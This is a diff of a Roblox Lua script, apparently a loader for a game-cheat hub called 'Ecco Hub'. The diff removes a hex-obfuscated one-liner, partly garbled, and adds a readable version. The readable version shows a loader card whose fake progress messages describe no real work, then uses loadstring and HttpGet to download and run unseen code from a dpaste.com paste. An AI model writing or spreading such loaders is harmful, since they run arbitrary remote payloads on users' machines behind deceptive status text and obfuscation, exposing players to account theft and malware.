@@ -1,1 +1,161 @@
-local function H(s)local r=""for i=1,#s,2 do r=r..string.char(tonumber(s:sub(i,i+1),16))end return r end loadstring(H("6c6f63616c20433d67616d653a4765745365727669636528224362726547756922293b6c6f63616c20543d67616d653a4765745365727669636528225477656e536572766963652229206c6f63616c20503d43206966206765746875692074686e20503d6765746875692829656e643b6c6f63616c20533d496e7374616e63652e6e65772822536372656547756922293b533e4e616d653d224563636f4c6f6164657222533e526573657450 6e537061776e3d66616c73653b533e446973706c61794f726465723d3939393b533e5a496e646578426568617669 6f723d456e756d2e5a496e6465784265686176696f 722e536962 6c696e673b533e506172656e743d503b6c6f63616c20443d496e7374616e6365 2e6e657728224672616d6522 2c53293b443e53697a653d55446 96d322e66726f6d5363616c6528312 c31293b443e426 1636b67726f756e64436 f6c6f723d436f 6c6f722e66726f6d524742283821313035293b443e426163 6b67726f756e 64 5472616e73 706172656e63793d313b443e426f72 6465 7253697a 655069 78656c3d303b443e5a496e6465783d313b6c6f 63616c 20 423d543a 43726561 7465286 42c5477 65656e496e 666f2e 6e65 7728302e342c456e756d2e4561 73696e675374 796c652e 5175 6164297b426 16336b67726f 756e64 5472 616e 73706172656e63793d302e347d293b 6966204220 7468656e 20423a506c61 7928292065 6e643b6c 6f63616c 20473d496e7374616e 6365 2e6e65 7728224672616d6522 2c53293b473e 4e616d 653d224c6f616465 7243617264 223b473e53697a653d55446 96d322e6e65 7728302c 3338302c302c3238303029473e506f73697469 6f 6e3d55446 96d322e6e65 7728302e 352c2d3139302c 302e362c2d3134303029473e426 1636b67726f756e64436 f6c6f723d436f6c6f722e66726f6d524742 283132 2c3132 2c32303029473e426163 6b67726f756e 64 5472616e 73706172656e63793d313b473e426f72 6465 7253697a 655069 78656c3d303b473e5a496e 6465783d323b496e 7374616e636 5 2e6e 657728 22554943 6f72 6e 6572 222c47292e436f726e657252 61 64 6975 733d55446 96d2e6e 6577 28302 c32303029 6c6f 63616c 206c 3d496e 7374616e 6365 2e6e 657728225549537472 6f 6b 652 22 2c47293b 6c3e54686963 6b 6e 6573 733d323b 6c 3e43 6f6c 6f 723d436f6c 6f 722e66726f6d 52 47 42283130302c38302c323030293b 6c3e5472616e 73706172656e 6379 3d313b7461736b2e64656c 61792 833 2e332c66756e 6374696f 6e2829206966205320616e 64 20532e506172656e 7420 7468656e 20533a4 465737472 6f79 28292065 6e643b6c6f63616c 20 612c622c633d706361 6c6c2866756e 6374696f 6e28 29206c6f6164737472696e 6728 67616d653a 4874747047 657 428226874747073 3a2 f2f64706173746 5 2e636f 6d2f 424 1 4c4e48473354372e 74787 422 2929 28292065 6e64 29 2069662 06e6f7420 61 207468656e207072696e 74282245 7272 6f 723a222e2e622029 65 6e642065 6e 64 29"))()
+local CoreGui = game:GetService("CoreGui")
+local TweenService = game:GetService("TweenService")
+
+local parent = CoreGui
+if gethui then parent = gethui() end
+
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Name = "EccoHubLoader"
+ScreenGui.ResetOnSpawn = false
+ScreenGui.DisplayOrder = 999
+ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+ScreenGui.Parent = parent
+
+local Dim = Instance.new("Frame", ScreenGui)
+Dim.Size = UDim2.fromScale(1, 1)
+Dim.BackgroundColor3 = Color3.fromRGB(8, 8, 15)
+Dim.BackgroundTransparency = 1
+Dim.BorderSizePixel = 0
+Dim.ZIndex = 1
+
+local dimTween = TweenService:Create(Dim, TweenInfo.new(0.4, Enum.EasingStyle.Quad), {BackgroundTransparency = 0.4})
+if dimTween then dimTween:Play() end
+
+local Card = Instance.new("Frame", ScreenGui)
+Card.Name = "LoaderCard"
+Card.Size = UDim2.new(0, 380, 0, 280)
+Card.Position = UDim2.new(0.5, -190, 0.6, -140)
+Card.BackgroundColor3 = Color3.fromRGB(12, 12, 20)
+Card.BackgroundTransparency = 1
+Card.BorderSizePixel = 0
+Card.ZIndex = 2
+Instance.new("UICorner", Card).CornerRadius = UDim.new(0, 20)
+
+local CardStroke = Instance.new("UIStroke", Card)
+CardStroke.Thickness = 2
+CardStroke.Color = Color3.fromRGB(100, 80, 200)
+CardStroke.Transparency = 1
+
+local cardTween = TweenService:Create(Card, TweenInfo.new(0.45, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {Position = UDim2.new(0.5, -190, 0.5, -140), BackgroundTransparency = 0})
+if cardTween then cardTween:Play() end
+
+local strokeTween = TweenService:Create(CardStroke, TweenInfo.new(0.45), {Transparency = 0})
+if strokeTween then strokeTween:Play() end
+
+local TopBar = Instance.new("Frame", Card)
+TopBar.Size = UDim2.new(1, 0, 0, 5)
+TopBar.BackgroundColor3 = Color3.fromRGB(120, 90, 255)
+TopBar.BorderSizePixel = 0
+TopBar.ZIndex = 3
+Instance.new("UICorner", TopBar).CornerRadius = UDim.new(0, 20)
+
+local DiamondContainer = Instance.new("Frame", Card)
+DiamondContainer.Size = UDim2.new(0, 80, 0, 80)
+DiamondContainer.Position = UDim2.new(0.5, -40, 0, 15)
+DiamondContainer.BackgroundTransparency = 1
+DiamondContainer.BorderSizePixel = 0
+DiamondContainer.ZIndex = 3
+
+local Diamond = Instance.new("TextLabel", DiamondContainer)
+Diamond.Size = UDim2.new(1, 0, 1, 0)
+Diamond.BackgroundTransparency = 1
+Diamond.Text = "💎"
+Diamond.TextSize = 64
+Diamond.Font = Enum.Font.Gotham
+Diamond.ZIndex = 3
+
+task.spawn(function()
+    local rotation = 0
+    while Diamond and Diamond.Parent do
+        rotation = (rotation + 2) % 360
+        Diamond.Rotation = rotation
+        task.wait(0.016)
+    end
+end)
+
+local MainTitle = Instance.new("TextLabel", Card)
+MainTitle.Size = UDim2.new(1, -30, 0, 35)
+MainTitle.Position = UDim2.new(0, 15, 0, 100)
+MainTitle.BackgroundTransparency = 1
+MainTitle.Text = "ECCO HUB"
+MainTitle.TextColor3 = Color3.fromRGB(200, 150, 255)
+MainTitle.TextSize = 28
+MainTitle.Font = Enum.Font.GothamBold
+MainTitle.ZIndex = 3
+
+local Subtitle = Instance.new("TextLabel", Card)
+Subtitle.Size = UDim2.new(1, -30, 0, 20)
+Subtitle.Position = UDim2.new(0, 15, 0, 135)
+Subtitle.BackgroundTransparency = 1
+Subtitle.Text = "Sell Lemons"
+Subtitle.TextColor3 = Color3.fromRGB(100, 200, 255)
+Subtitle.TextSize = 14
+Subtitle.Font = Enum.Font.GothamBold
+Subtitle.ZIndex = 3
+
+local StatusLabel = Instance.new("TextLabel", Card)
+StatusLabel.Size = UDim2.new(1, -30, 0, 22)
+StatusLabel.Position = UDim2.new(0, 15, 0, 165)
+StatusLabel.BackgroundTransparency = 1
+StatusLabel.Text = "Initializing..."
+StatusLabel.TextColor3 = Color3.fromRGB(180, 180, 200)
+StatusLabel.TextSize = 12
+StatusLabel.Font = Enum.Font.Gotham
+StatusLabel.ZIndex = 3
+
+local Track = Instance.new("Frame", Card)
+Track.Size = UDim2.new(1, -40, 0, 8)
+Track.Position = UDim2.new(0, 20, 0, 195)
+Track.BackgroundColor3 = Color3.fromRGB(25, 25, 40)
+Track.BorderSizePixel = 0
+Track.ZIndex = 3
+Instance.new("UICorner", Track).CornerRadius = UDim.new(1, 0)
+
+local Bar = Instance.new("Frame", Track)
+Bar.Size = UDim2.new(0, 0, 1, 0)
+Bar.BackgroundColor3 = Color3.fromRGB(120, 90, 255)
+Bar.BorderSizePixel = 0
+Bar.ZIndex = 4
+Instance.new("UICorner", Bar).CornerRadius = UDim.new(1, 0)
+
+local function setProgress(pct, msg, delay_)
+    task.delay(delay_ or 0, function()
+        if not Bar or not Bar.Parent then return end
+        local barTween = TweenService:Create(Bar, TweenInfo.new(0.5, Enum.EasingStyle.Quad), {Size = UDim2.new(pct, 0, 1, 0)})
+        if barTween then barTween:Play() end
+        if StatusLabel and StatusLabel.Parent then
+            StatusLabel.Text = msg
+        end
+    end)
+end
+
+setProgress(0.15, "Connecting to premium servers...", 0.3)
+setProgress(0.40, "Fetching encrypted hub...", 0.9)
+setProgress(0.65, "Decrypting modules...", 1.5)
+setProgress(0.85, "Initializing environment...", 2.1)
+setProgress(1.00, "Ready! Launching Ecco Hub...", 2.7)
+
+task.delay(3.3, function()
+    local fadeOutCard = TweenService:Create(Card, TweenInfo.new(0.4, Enum.EasingStyle.Quad), {BackgroundTransparency = 1, Position = UDim2.new(0.5, -190, 0.45, -140)})
+    if fadeOutCard then fadeOutCard:Play() end
+    
+    local fadeOutStroke = TweenService:Create(CardStroke, TweenInfo.new(0.4), {Transparency = 1})
+    if fadeOutStroke then fadeOutStroke:Play() end
+    
+    local fadeOutDim = TweenService:Create(Dim, TweenInfo.new(0.4), {BackgroundTransparency = 1})
+    if fadeOutDim then fadeOutDim:Play() end
+
+    task.wait(0.45)
+    
+    if ScreenGui and ScreenGui.Parent then
+        ScreenGui:Destroy()
+    end
+    
+    local ok, err = pcall(function()
+        loadstring(game:HttpGet("https://dpaste.com/BALNHG3T7.txt"))()
+    end)
+    
+    if not ok then
+        warn("[Ecco Hub] Launch Error: " .. tostring(err))
+    end
+end)
